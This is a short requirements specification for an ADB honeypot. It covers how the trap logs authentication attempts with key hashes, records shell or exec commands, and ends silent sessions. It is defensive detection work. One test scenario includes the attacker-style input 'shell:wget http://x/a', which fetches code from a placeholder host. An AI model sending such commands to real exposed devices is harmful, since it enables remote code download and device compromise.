## ADDED Requirements

### Requirement: Post-AUTH capture
After sending the AUTH token the ADB trap SHALL read the next packet. An `AUTH` packet (signature or public key) SHALL be recorded as an auth attempt with a hash of the key. An `OPEN` packet whose destination starts with `shell:` or `exec:` SHALL be recorded as a command (bounded to 256 bytes) and answered with `CLSE`.

#### Scenario: Shell open
- **WHEN** a client completes CNXN and sends `OPEN` with destination `shell:wget http://x/a`
- **THEN** a command is logged and the connection receives `CLSE`

#### Scenario: Public key
- **WHEN** a client answers the token with an `AUTH` public key packet
- **THEN** an auth attempt with a key hash is logged and no key bytes appear in alert meta

#### Scenario: Silent client
- **WHEN** the client sends nothing after the token
- **THEN** the session ends at the session timeout with outcome `timeout`
